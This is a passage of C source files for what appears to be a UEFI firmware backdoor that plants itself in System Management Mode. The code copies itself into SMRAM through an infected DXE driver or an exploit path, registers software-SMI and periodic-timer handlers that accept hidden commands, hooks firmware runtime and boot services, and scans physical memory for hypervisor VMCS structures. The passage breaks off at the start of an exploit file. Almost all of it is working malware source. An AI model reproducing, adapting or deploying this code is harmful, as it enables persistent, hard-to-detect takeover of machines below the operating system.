                DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Ctl.Status);
                break;
            }

            // get IDT address
            Ctl.Status = SmmCpu->ReadSaveState(
                SmmCpu, sizeof(IdtBase), EFI_SMM_SAVE_STATE_REGISTER_IDTBASE,
                CpuIndex, (VOID *)&IdtBase
            );
            if (EFI_ERROR(Ctl.Status))
            {
                DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Ctl.Status);
                break;
            }

            Ctl.Args.FindVmcs.Found = 0;

            // enumerate all of the memory pages of specified region
            for (i = 0; i < SearchSize; i += PAGE_SIZE)
            {
                UINT64 PageAddr = SearchAddr + i;

                // map physical memoy page at SMM virtual address
                if (PHYS_MAP(PageAddr))
                {
                    UINT8 *TargetAddr = MAPPED_ADDR(PageAddr);

                    // check for valid VMCS region
                    if (*(UINT64 *)TargetAddr == RevisionId)
                    {
                        // scan VMCS region for known values
                        if (VmcsSearchVal(TargetAddr, VMCS_SEARCH_SIZE, GdtBase) &&
                            VmcsSearchVal(TargetAddr, VMCS_SEARCH_SIZE, IdtBase) &&
                            VmcsSearchVal(TargetAddr, VMCS_SEARCH_SIZE, ControlRegs->Cr0))
                        {
                            // potential VMCS was found
                            Ctl.Args.FindVmcs.Found = PageAddr;
                        }
                    }

                    PHYS_REVERT();
                }

                if (Ctl.Args.FindVmcs.Found != 0)
                {
                    // return to the caller
                    Ctl.Status = EFI_SUCCESS;
                    break;
                }
            }

            break;
        }

    default:
        {
            Ctl.Status = EFI_INVALID_PARAMETER;
            break;
        }
    }

_end:

    // map backdoor call arguments at SMM virtual address
    if (PHYS_MAP(ArgsAddr))
    {
        UINT8 *TargetAddr = MAPPED_ADDR(ArgsAddr);

        // copy backdoor call arguments from the local buffer
        std_memcpy(TargetAddr, &Ctl, sizeof(BACKDOOR_CTL));

        PHYS_REVERT();
    }

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
EFI_STATUS EFIAPI SwDispatch2Handler(
    EFI_HANDLE DispatchHandle, CONST VOID *Context,
    VOID *CommBuffer, UINTN *CommBufferSize)
{
    EFI_SMM_SW_CONTEXT *SwContext = (EFI_SMM_SW_CONTEXT *)CommBuffer;
    EFI_SMM_CPU_PROTOCOL *SmmCpu = NULL;
    EFI_STATUS Status = EFI_SUCCESS;

    if (SwContext->DataPort != BACKDOOR_CTL_TIMER_ENABLE)
    {
        DbgMsg(
            __FILE__, __LINE__, __FUNCTION__"(): Command = 0x%x, data = 0x%x\r\n",
            SwContext->CommandPort, SwContext->DataPort
        );
    }

    if ((Status = m_Smst->SmmLocateProtocol(&gEfiSmmCpuProtocolGuid, NULL, (VOID **)&SmmCpu)) == EFI_SUCCESS)
    {
        UINT64 Code = (UINT64)SwContext->DataPort;
        UINTN CpuIndex = SwContext->SwSmiCpuIndex;
        CONTROL_REGS ControlRegs;
        UINT64 Rcx = 0;         

        ControlRegs.Cr0 = ControlRegs.Cr3 = ControlRegs.Cr4 = 0;

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(ControlRegs.Cr0), EFI_SMM_SAVE_STATE_REGISTER_CR0, 
            CpuIndex, (VOID *)&ControlRegs.Cr0
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(ControlRegs.Cr3), EFI_SMM_SAVE_STATE_REGISTER_CR3, 
            CpuIndex, (VOID *)&ControlRegs.Cr3
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(Rcx), EFI_SMM_SAVE_STATE_REGISTER_RCX, 
            CpuIndex, (VOID *)&Rcx
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        if (Code != BACKDOOR_CTL_TIMER_ENABLE)
        {
            DbgMsg(
                __FILE__, __LINE__, __FUNCTION__"(): CPU #%d, code = 0x%llx, arg = 0x%llx\r\n",
                CpuIndex, Code, Rcx
            );
        }

        // handle backdoor control request
        SmmCtlHandle(CpuIndex, SmmCpu, Code, Rcx, &ControlRegs);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "LocateProtocol() ERROR 0x%x\r\n", Status);   
    }

_end:

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
#ifdef USE_PERIODIC_TIMER

EFI_STATUS EFIAPI PeriodicTimerDispatch2Handler(
    EFI_HANDLE DispatchHandle, CONST VOID *Context,
    VOID *CommBuffer, UINTN *CommBufferSize)
{
    EFI_SMM_CPU_PROTOCOL *SmmCpu = NULL;
    EFI_STATUS Status = EFI_SUCCESS;

    if ((Status = m_Smst->SmmLocateProtocol(&gEfiSmmCpuProtocolGuid, NULL, (VOID **)&SmmCpu)) == EFI_SUCCESS)
    {
        UINTN CpuIndex = m_Smst->CurrentlyExecutingCpu;
        CONTROL_REGS ControlRegs;
        UINT64 Rcx = 0, Rdi = 0, Rsi = 0, R8 = 0, R9 = 0;         

        ControlRegs.Cr0 = ControlRegs.Cr3 = ControlRegs.Cr4 = 0;

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(ControlRegs.Cr0), EFI_SMM_SAVE_STATE_REGISTER_CR0, 
            CpuIndex, (VOID *)&ControlRegs.Cr0
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(ControlRegs.Cr3), EFI_SMM_SAVE_STATE_REGISTER_CR3, 
            CpuIndex, (VOID *)&ControlRegs.Cr3
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(Rcx), EFI_SMM_SAVE_STATE_REGISTER_RCX, 
            CpuIndex, (VOID *)&Rcx
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(Rdi), EFI_SMM_SAVE_STATE_REGISTER_RDI, 
            CpuIndex, (VOID *)&Rdi
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(Rsi), EFI_SMM_SAVE_STATE_REGISTER_RSI, 
            CpuIndex, (VOID *)&Rsi
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(R8), EFI_SMM_SAVE_STATE_REGISTER_R8, 
            CpuIndex, (VOID *)&R8
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        Status = SmmCpu->ReadSaveState(
            SmmCpu, sizeof(R9), EFI_SMM_SAVE_STATE_REGISTER_R9, 
            CpuIndex, (VOID *)&R9
        );
        if (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            goto _end;
        }

        /* 
            Check for magic values that was set in smm_call(),
            see smm_call/smm_call.asm for more info.
        */
        if (R8 == BACKDOOR_CALL_R8_VAL && R9 == BACKDOOR_CALL_R9_VAL)
        {            
            DbgMsg(
                __FILE__, __LINE__, __FUNCTION__"(): CPU #%d, code = 0x%llx, arg = 0x%llx\r\n",
                CpuIndex, Rdi, Rsi
            );

            // handle backdoor control request
            SmmCtlHandle(CpuIndex, SmmCpu, Rdi, Rsi, &ControlRegs);

            /* 
                Increment RCX value to quit from the loop:

                    _loop:

                    48 ff ca    dec     rdx
                    74 02       jz      $+4
                    ff e1       jmp     rcx ; _loop

                                ...
            */
            Rcx += 7;
            
            Status = SmmCpu->WriteSaveState(
                SmmCpu, sizeof(Rcx), EFI_SMM_SAVE_STATE_REGISTER_RCX, 
                CpuIndex, (VOID *)&Rcx
            );
            if (EFI_ERROR(Status))
            {
                DbgMsg(__FILE__, __LINE__, "ReadSaveState() ERROR 0x%x\r\n", Status);
            }
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "LocateProtocol() ERROR 0x%x\r\n", Status);   
    }

_end:

    return EFI_SUCCESS;
}

#endif // USE_PERIODIC_TIMER
//--------------------------------------------------------------------------------------
#ifdef USE_PERIODIC_TIMER

EFI_STATUS EFIAPI PeriodicTimerDispatch2Notify(
    CONST EFI_GUID *Protocol, 
    VOID *Interface, 
    EFI_HANDLE Handle)
{
    m_TimerDispatch = (EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *)Interface;       

    return EFI_SUCCESS;
}

#endif // USE_PERIODIC_TIMER

EFI_STATUS EFIAPI SwDispatch2Notify(
    CONST EFI_GUID *Protocol, 
    VOID *Interface, 
    EFI_HANDLE Handle)
{
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_HANDLE DispatchHandle = NULL;

    EFI_SMM_SW_DISPATCH2_PROTOCOL *SwDispatch = 
        (EFI_SMM_SW_DISPATCH2_PROTOCOL *)Interface;    

    DbgMsg(__FILE__, __LINE__, "Max. SW SMI value is 0x%x\r\n", SwDispatch->MaximumSwiValue);

    // register software SMI handler
    Status = SwDispatch->Register(
        SwDispatch, 
        SwDispatch2Handler, 
        &m_SwDispatchRegCtx,
        &DispatchHandle
    );
    if (Status == EFI_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, "SW SMI handler is at "FPTR"\r\n", SwDispatch2Handler);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "Register() ERROR 0x%x\r\n", Status);
    }

    return EFI_SUCCESS;   
}

VOID BackdoorSmm(EFI_SMM_SYSTEM_TABLE2 *Smst)
{
    VOID *Registration = NULL;
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_PHYSICAL_ADDRESS Addr = 0;     
    EFI_SMM_SW_DISPATCH2_PROTOCOL *SwDispatch = NULL;   

#ifdef USE_PERIODIC_TIMER

    EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL *TimerDispatch = NULL;    

#endif

    m_Smst = Smst;

    ConsoleDisable();

    DbgMsg(__FILE__, __LINE__, "Running in SMM\r\n"); 
    DbgMsg(__FILE__, __LINE__, "SMM system table is at "FPTR"\r\n", Smst);            

    // allocate temp buffer
    Status = m_Smst->SmmAllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesData,
        1, &Addr
    );
    if (Status == EFI_SUCCESS)
    {
        m_TempBuff = (UINT8 *)Addr;
    }

    Status = m_Smst->SmmLocateProtocol(
        &gEfiSmmSwDispatch2ProtocolGuid, NULL,
        &SwDispatch
    );
    if (Status == EFI_SUCCESS)
    {
        // protocol is already registered, call notify handler directly
        SwDispatch2Notify(
            &gEfiSmmSwDispatch2ProtocolGuid,
            SwDispatch, NULL
        );
    }
    else
    {
        // wait for the protocol registration
        RegisterProtocolNotifySmm(
            &gEfiSmmSwDispatch2ProtocolGuid,
            SwDispatch2Notify,
            &Registration
        );
    }

#ifdef USE_PERIODIC_TIMER

    Status = m_Smst->SmmLocateProtocol(
        &gEfiSmmPeriodicTimerDispatch2ProtocolGuid, NULL, 
        &TimerDispatch
    );
    if (Status == EFI_SUCCESS)
    {
        // protocol is already registered, call notify handler directly
        PeriodicTimerDispatch2Notify(
            &gEfiSmmPeriodicTimerDispatch2ProtocolGuid,
            TimerDispatch, NULL
        );
    }
    else
    {
        // wait for the protocol registration
        RegisterProtocolNotifySmm(
            &gEfiSmmPeriodicTimerDispatch2ProtocolGuid,
            PeriodicTimerDispatch2Notify,
            &Registration
        );    
    }

#endif // USE_PERIODIC_TIMER

}

VOID BackdoorSmmCall(EFI_SMM_SYSTEM_TABLE2 *Smst)
{
    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
        m_ImageBase,
        ((EFI_IMAGE_DOS_HEADER *)m_ImageBase)->e_lfanew
    );

    UINTN PagesCount = (pHeaders->OptionalHeader.SizeOfImage / PAGE_SIZE) + 1;
    EFI_PHYSICAL_ADDRESS Addr = 0;

    // allocate SMRAM memory for backdoor image
    EFI_STATUS Status = Smst->SmmAllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesData,
        PagesCount,
        &Addr
    );
    if (Status == EFI_SUCCESS)
    {
        VOID *Image = (VOID *)Addr;

        BACKDOOR_ENTRY_SMM Entry = (BACKDOOR_ENTRY_SMM)RVATOVA(
            Image,
            (UINT8 *)BackdoorSmm - (UINT8 *)m_ImageBase
        );

        // copy image to the new location
        m_BS->CopyMem(Image, m_ImageBase, pHeaders->OptionalHeader.SizeOfImage);

        // update image relocations in according to the new address
        LDR_UPDATE_RELOCS(Image, m_ImageBase, Image);

        // execute SMM entry point of the backdoor
        Entry(Smst);
    }
}
//--------------------------------------------------------------------------------------
VOID GenerateSoftwareSMI(UINT8 Data, UINT8 Command)
{
    // fire software SMI using APMC
    __outbyte(APMC_DATA, Data);
    __outbyte(APMC_COMMAND, Command);
}

#ifdef USE_PERIODIC_TIMER

// original address of hooked functions
EFI_GET_NEXT_VARIABLE_NAME old_GetNextVariableName = NULL;
EFI_SET_VIRTUAL_ADDRESS_MAP old_SetVirtualAddressMap = NULL;

VOID EnablePeriodicTimer(VOID)
{
    // communicate with SMM backdoor to enable periodic timer software SMI
    GenerateSoftwareSMI(BACKDOOR_CTL_TIMER_ENABLE, BACKDOOR_SW_SMI_VAL);
}

EFI_STATUS EFIAPI new_GetNextVariableName(
    UINTN *VariableNameSize,
    CHAR16 *VariableName,
    EFI_GUID *VendorGuid)
{
    EnablePeriodicTimer();   

    // call original function
    return old_GetNextVariableName(VariableNameSize, VariableName, VendorGuid);
}

EFI_STATUS EFIAPI new_SetVirtualAddressMap(
    UINTN MemoryMapSize,
    UINTN DescriptorSize,
    UINT32 DescriptorVersion,
    EFI_MEMORY_DESCRIPTOR *VirtualMap)
{
    UINTN i = 0;
    EFI_MEMORY_DESCRIPTOR *MapEntry = VirtualMap;

    /*
        Copy old function address from the global variable because
        image relocations might be reparsed in this function.
    */
    EFI_SET_VIRTUAL_ADDRESS_MAP Func = old_SetVirtualAddressMap;

    ConsoleDisable();

    EnablePeriodicTimer();

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");

    #define FIXUP_ADDR(_addr_) ((EFI_PHYSICAL_ADDRESS)(_addr_) - Addr + MapEntry->VirtualStart)

    #define CHECK_ADDR(_addr_) ((EFI_PHYSICAL_ADDRESS)(_addr_) >= Addr && \
                                (EFI_PHYSICAL_ADDRESS)(_addr_) < (EFI_PHYSICAL_ADDRESS)RVATOVA(Addr, Len))

    // enumerate virtual memory mappings
    for (i = 0; i < MemoryMapSize / DescriptorSize; i += 1)
    {
        UINTN Len = MapEntry->NumberOfPages * PAGE_SIZE;
        EFI_PHYSICAL_ADDRESS Addr = MapEntry->PhysicalStart;

        // check for memory region that contants backdoor image
        if (CHECK_ADDR(m_ImageBase))
        {
            VOID *ImageBaseOld = m_ImageBase;

            // calculate new virtual address of backdoor image
            VOID *ImageBaseNew = (VOID *)FIXUP_ADDR(ImageBaseOld);

            DbgMsg(
                __FILE__, __LINE__, 
                "New address of the resident image is "FPTR"\r\n", ImageBaseNew
            );

            m_ImageBase = ImageBaseNew;

            // update image relocations acording to the new address
            LDR_UPDATE_RELOCS(ImageBaseOld, ImageBaseOld, ImageBaseNew);

            break;
        }

        // go to the next entry
        MapEntry = (EFI_MEMORY_DESCRIPTOR *)((UINT8 *)MapEntry + DescriptorSize);
    }

    // call original function
    return Func(MemoryMapSize, DescriptorSize, DescriptorVersion, VirtualMap);
}

VOID BackdoorInitRuntimeHooks(VOID)
{
    // hook GetNextVariableName() runtime function
    old_GetNextVariableName = m_RT->GetNextVariableName;
    m_RT->GetNextVariableName = new_GetNextVariableName;

    // hook SetVirtualAddressMap() runtime function
    old_SetVirtualAddressMap = m_RT->SetVirtualAddressMap;
    m_RT->SetVirtualAddressMap = new_SetVirtualAddressMap;
}

#endif // USE_PERIODIC_TIMER

VOID BackdoorResidentCommon(VOID *Image)
{
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_SMM_ACCESS2_PROTOCOL *SmmAccess2 = NULL;
    UINTN i = 0;

    // update image base address
    m_ImageBase = Image;

    // for debug messages output on the screen
    SimpleTextOutProtocolNotifyRegister();

#ifdef USE_PERIODIC_TIMER

    // install hooks to enable periodic timer during RT phase
    BackdoorInitRuntimeHooks();

#endif

    // locate SMM access 2 protocol
    if ((Status = m_BS->LocateProtocol(&gEfiSmmAccess2ProtocolGuid, NULL, (VOID **)&SmmAccess2)) == EFI_SUCCESS)
    {        
        DbgMsg(__FILE__, __LINE__, "SMM access 2 protocol is at "FPTR"\r\n", SmmAccess2);
        DbgMsg(__FILE__, __LINE__, "Available SMRAM regions:\r\n");

        m_SmramMapSize = sizeof(m_SmramMap);

        // get SMRAM regions information
        if ((Status = SmmAccess2->GetCapabilities(SmmAccess2, &m_SmramMapSize, m_SmramMap)) == EFI_SUCCESS)
        {
            for (i = 0; i < m_SmramMapSize / sizeof(EFI_SMRAM_DESCRIPTOR); i += 1)
            {
                DbgMsg(
                    __FILE__, __LINE__, " * 0x%.8llx:0x%.8llx\r\n", 
                    m_SmramMap[i].PhysicalStart,
                    m_SmramMap[i].PhysicalStart + m_SmramMap[i].PhysicalSize - 1
                );
            }

            if (m_SmramMapSize > 0)
            {
                /*
                    Use beginnig of the SMRAM as dummy page for VirtualAddrRemap()
                */
                m_DummyPage = m_SmramMap[0].PhysicalStart;
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "GetCapabilities() ERROR 0x%x\r\n", Status);

            m_SmramMapSize = 0;
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "LocateProtocol() ERROR 0x%x\r\n", Status);
    }
}
//--------------------------------------------------------------------------------------
VOID BackdoorResidentDma(VOID *Image)
{
    PINFECTOR_STATUS Status = (PINFECTOR_STATUS)(INFECTOR_STATUS_ADDR);

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");

    // perform common initialization
    BackdoorResidentCommon(Image);

    // report sucessfully executed DXE driver
    Status->Success += 1;

    // run exploit to load backdoor into SMRAM and execute its entry point
    Exploit(BackdoorSmmCall);
}
//--------------------------------------------------------------------------------------
VOID BackdoorResidentInfector(VOID *Image)
{
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_SMM_BASE2_PROTOCOL *SmmBase = NULL;    

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");

    // perform common initialization
    BackdoorResidentCommon(Image);

    // locate SMM base protocol
    if ((Status = m_BS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, NULL, (VOID **)&SmmBase)) == EFI_SUCCESS)
    {
        BOOLEAN bInSmm = FALSE;        

        // check if we're currently running in SMM
        SmmBase->InSmm(SmmBase, &bInSmm);

        if (bInSmm)
        {
            EFI_SMM_SYSTEM_TABLE2 *Smst = NULL;

            if ((Status = SmmBase->GetSmstLocation(SmmBase, &Smst)) == EFI_SUCCESS)
            {
                // load backdoor into the SMRAM and execute its entry point
                BackdoorSmmCall(Smst);
            }   
            else
            {
                DbgMsg(__FILE__, __LINE__, "GetSmstLocation() ERROR 0x%x\r\n", Status);
            }
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "LocateProtocol() ERROR 0x%x\r\n", Status);
    }
}
//--------------------------------------------------------------------------------------
void BackdoorEntryCall(EFI_SYSTEM_TABLE *SystemTable, BACKDOOR_ENTRY_RESIDENT EntryProc)
{
    VOID *Image = NULL;

    m_ST = SystemTable;
    m_BS = SystemTable->BootServices;
    m_RT = SystemTable->RuntimeServices;

#if defined(BACKDOOR_DEBUG_SERIAL)

    // initialize serial port I/O for debug messages
    SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);

#endif        

#if defined(BACKDOOR_DEBUG)

    // initialize text output
    ConsoleInitialize();

    DbgMsg(__FILE__, __LINE__, "******************************\r\n");
    DbgMsg(__FILE__, __LINE__, "                              \r\n");
    DbgMsg(__FILE__, __LINE__, "  SMM backdoor loaded         \r\n");
    DbgMsg(__FILE__, __LINE__, "                              \r\n");
    DbgMsg(__FILE__, __LINE__, "******************************\r\n");

#endif
    
    // copy image to the new location
    if ((Image = ImageRelocate(m_ImageBase)) != NULL)
    {
        BACKDOOR_ENTRY_RESIDENT Entry = (BACKDOOR_ENTRY_RESIDENT)RVATOVA(
            Image,
            (UINT8 *)EntryProc - (UINT8 *)m_ImageBase
        );
        
        DbgMsg(__FILE__, __LINE__, "Resident code base address is "FPTR"\r\n", Image);
        
        // execute backdoor resident code
        Entry(Image);
    } 
}
//--------------------------------------------------------------------------------------
EFI_STATUS EFIAPI BackdoorEntryDma(EFI_GUID *Protocol, VOID *Registration, VOID **Interface)
{
    EFI_LOCATE_PROTOCOL LocateProtocol = NULL;
    EFI_SYSTEM_TABLE *SystemTable = NULL;
    VOID *Base = NULL;

    // get backdoor image base address
    if ((Base = ImageBaseByAddress(get_addr())) == NULL)
    {
        return EFI_SUCCESS;
    }

    // setup correct image relocations
    if (!LdrProcessRelocs(Base, Base))
    {
        return EFI_SUCCESS;   
    }    

    m_ImageBase = Base;  

    LocateProtocol = (EFI_LOCATE_PROTOCOL)m_InfectorConfig.LocateProtocol;
    SystemTable = (EFI_SYSTEM_TABLE *)m_InfectorConfig.SystemTable;    

    if (LocateProtocol != NULL)
    {
        // remove LocateProtocol() hook
        SystemTable->BootServices->LocateProtocol = LocateProtocol;
    }

    // call the backdoor
    BackdoorEntryCall(SystemTable, BackdoorResidentDma);    

    if (LocateProtocol != NULL)
    {
        // call original function
        return LocateProtocol(Protocol, Registration, Interface);
    }

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
EFI_STATUS EFIAPI BackdoorEntryInfected(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
    VOID *Base = NULL;
    EFI_LOADED_IMAGE *LoadedImage = NULL;

    // get backdoor image base address
    if ((Base = ImageBaseByAddress(get_addr())) == NULL)
    {
        return EFI_SUCCESS;
    }

    // setup correct image relocations
    if (!LdrProcessRelocs(Base, Base))
    {
        return EFI_SUCCESS;   
    }    

    m_ImageBase = Base;  

    // call the backdoor
    BackdoorEntryCall(SystemTable, BackdoorResidentInfector);    

    // get current image information
    m_BS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID *)&LoadedImage);  

    if (LoadedImage && m_InfectorConfig.OriginalEntryPoint != 0)
    {
        EFI_IMAGE_ENTRY_POINT Entry = (EFI_IMAGE_ENTRY_POINT)RVATOVA(
            LoadedImage->ImageBase,
            m_InfectorConfig.OriginalEntryPoint
        );

        // call original entry point
        return Entry(ImageHandle, SystemTable);
    }

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
EFI_STATUS EFIAPI _ModuleEntryPoint(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) 
{
    // ...

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
// EoF

```

`src/backdoor.h`:

```h

#ifndef _BOOT_BACKDOOR_H_
#define _BOOT_BACKDOOR_H_

#pragma warning(disable: 4200)

#define MAX_IMAGE_SIZE (1 * 1024 * 1024)

// physical address of INFECTOR_STATUS
#define INFECTOR_STATUS_ADDR (0x1000 - sizeof(INFECTOR_STATUS))

#pragma pack(1)

typedef struct _INFECTOR_CONFIG
{
    UINT64 BackdoorEntryDma;
    UINT64 LocateProtocol;
    UINT64 SystemTable;
    UINT64 BackdoorEntryInfected;
    UINT64 OriginalEntryPoint;

} INFECTOR_CONFIG,
*PINFECTOR_CONFIG;

typedef struct _INFECTOR_STATUS
{
    UINT64 Success;
    UINT64 Unused;

} INFECTOR_STATUS,
*PINFECTOR_STATUS;

#pragma pack()

void ConsolePrint(char *Message);
VOID GenerateSoftwareSMI(UINT8 Data, UINT8 Command);

#endif

```

`src/common.h`:

```h

#ifndef _COMMON_H_
#define _COMMON_H_

#define ALIGN_DOWN(x, align) (x &~ (align - 1))
#define ALIGN_UP(x, align) ((x & (align - 1)) ? ALIGN_DOWN(x, align) + align : x)

#define RVATOVA(_base_, _offset_) ((UINT8 *)(_base_) + (UINT32)(_offset_))

#define PAGE_SHIFT 12

#define PAGE_SIZE 0x1000
#define PAGE_SIZE_2M 0x200000

// default raw image section alignment for EDK
#define DEFAULT_EDK_ALIGN 0x20

#define TO_MILLISECONDS(_seconds_) ((_seconds_) * 1000)
#define TO_MICROSECONDS(_seconds_) (TO_MILLISECONDS(_seconds_) * 1000)
#define TO_NANOSECONDS(_seconds_) (TO_MICROSECONDS(_seconds_) * 1000)

// convert GUID to string in simple way
#define GUID_STR_MAXLEN 38
#define GUID_STR(_str_, _guid_)                                                 \
                                                                                \
    tfp_sprintf((_str_), "{%.8X-%.4X-%.4X-%.2X%.2X-%.2X%.2X%.2X%.2X%.2X%.2X}",  \
        (_guid_)->Data1, (_guid_)->Data2, (_guid_)->Data3,                      \
        (_guid_)->Data4[0], (_guid_)->Data4[1],                                 \
        (_guid_)->Data4[2], (_guid_)->Data4[3],                                 \
        (_guid_)->Data4[4], (_guid_)->Data4[5],                                 \
        (_guid_)->Data4[6], (_guid_)->Data4[7]                                  \
    );

#define PCI_ADDR(_bus_, _dev_, _func_, _addr_)                              \
                                                                            \
    (unsigned int)(((_bus_) << 16) | ((_dev_) << 11) | ((_func_) << 8) |    \
                   ((_addr_) & 0xfc) | ((unsigned int)0x80000000))

#define FPTR32 "0x%x"
#define FPTR64 "0x%llx"

#if defined(_M_X64) || defined(__amd64__)

#define FPTR FPTR64

#else

#define FPTR FPTR32                  

#endif
#endif

```

`src/debug.c`:

```c
#include <FrameworkSmm.h>

#include "../config.h"

#include "common.h"
#include "serial.h"
#include "printf.h"
#include "debug.h"
#include "ovmf.h"
#include "backdoor.h"
#include "std.h"
//--------------------------------------------------------------------------------------
#if defined(BACKDOOR_DEBUG)

static char *NameFromPath(char *lpszPath)
{
    int sep = -1;
    unsigned int i = 0;

    for (i = 0; i < std_strlen(lpszPath); i += 1)
    {
        if (lpszPath[i] == '\\' || lpszPath[i] == '/')
        {
            sep = i;
        }
    }

    if (sep >= 0)
    {
        return lpszPath + sep + 1;
    }

    return lpszPath;
}
//--------------------------------------------------------------------------------------
void DbgMsg(char *lpszFile, int Line, char *lpszMsg, ...)
{
    va_list arglist;
    char szBuff[MAX_STR_LEN], szMessage[MAX_STR_LEN];    
    unsigned int i = 0;

    szBuff[MAX_STR_LEN - 1] = '\0';

    va_start(arglist, lpszMsg);    
    tfp_vsnprintf(szBuff, MAX_STR_LEN - 1, lpszMsg, arglist);
    va_end(arglist);

    lpszFile = NameFromPath(lpszFile);
    szMessage[MAX_STR_LEN - 1] = '\0';

    // build debug message string
    tfp_snprintf(szMessage, MAX_STR_LEN - 1, "%s(%d) : %s", lpszFile, Line, szBuff);

    // print message to the screen
    ConsolePrint(szMessage);

    for (i = 0; i < std_strlen(szMessage); i += 1)
    {

#if defined(BACKDOOR_DEBUG_OVMF)

        // send single byte to OVMF debug port
        __outbyte(OVMF_DEBUG_PORT, szMessage[i]);        

#elif defined(BACKDOOR_DEBUG_SERIAL)

        // send single byte via serial port
        SerialPortWrite(SERIAL_PORT_NUM, szMessage[i]);

#endif

    }
}

#endif // BACKDOOR_DEBUG
//--------------------------------------------------------------------------------------
// EoF

```

`src/debug.h`:

```h

#ifndef _DEBUG_H_
#define _DEBUG_H_

#define MAX_STR_LEN 255

static int m_foo = 0;

#define DbgStop() while (m_foo == 0) {}

#ifdef BACKDOOR_DEBUG

void DbgMsg(char *lpszFile, int Line, char *lpszMsg, ...);

#else

#define DbgMsg

#endif
#endif

```

`src/exploit.c`:

```c
#include <FrameworkSmm.h>

#include <Protocol/SmmBase2.h>
#include <Protocol/SmmCommunication.h>

#include <Guid/EventGroup.h>

#include <IndustryStandard/PeImage.h>

#include "../config.h"
#include "../interface.h"

#include "common.h"
#include "debug.h"
#include "loader.h"
#include "backdoor.h"
#include "exploit.h"
#include "virtmem.h"

EFI_LOCATE_HANDLE_BUFFER old_LocateHandleBuffer = NULL;

EXPLOIT_PROC m_ExploitProc = NULL;
BOOLEAN m_bSmmHandlerExecuted = FALSE;

// SMM communication structure
EFI_SMM_COMMUNICATE_HEADER m_CommunicateHeader;

// defined in backdoor.c
extern EFI_BOOT_SERVICES *m_BS;
extern EFI_SMRAM_DESCRIPTOR m_SmramMap[MAX_SMRAM_REGIONS];
extern UINTN m_SmramMapSize;

/*
    SmmDriverDispatchHandler() SMI handler of PiSmmCore used to load SMM drivers 
    when needed DXE drivers has been initialized and Firmware Volume protocol is 
    ready to use:

        EFI_STATUS
        EFIAPI
        SmmDriverDispatchHandler (
          IN     EFI_HANDLE  DispatchHandle,
          IN     CONST VOID  *Context,        OPTIONAL
          IN OUT VOID        *CommBuffer,     OPTIONAL
          IN OUT UINTN       *CommBufferSize  OPTIONAL
          )
        {
          // ...

          HandleBuffer = NULL;
          Status = gBS->LocateHandleBuffer (
                          ByProtocol,
                          &gEfiFirmwareVolume2ProtocolGuid,
                          NULL,
                          &HandleCount,
